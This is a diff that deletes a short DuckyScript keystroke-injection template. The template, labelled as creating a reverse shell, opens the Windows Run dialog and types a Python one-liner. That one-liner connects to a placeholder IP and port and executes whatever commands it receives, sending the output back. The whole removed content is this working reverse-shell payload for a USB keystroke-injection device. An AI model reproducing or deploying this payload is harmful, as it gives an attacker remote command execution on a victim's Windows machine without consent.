@@ -1,6 +1,0 @@
-REM Creates a reverse shell using python3
-DELAY {start_delay}
-GUI r
-DELAY 350
-STRING pyw -c "exec('import socket as s\nfrom subprocess import getoutput as g\nc=s.socket()\nc.connect((\'{ip}\',{port}))\nwhile 1:c.send(g(c.recv(9999).decode()).encode())')"
-{windows_admin}
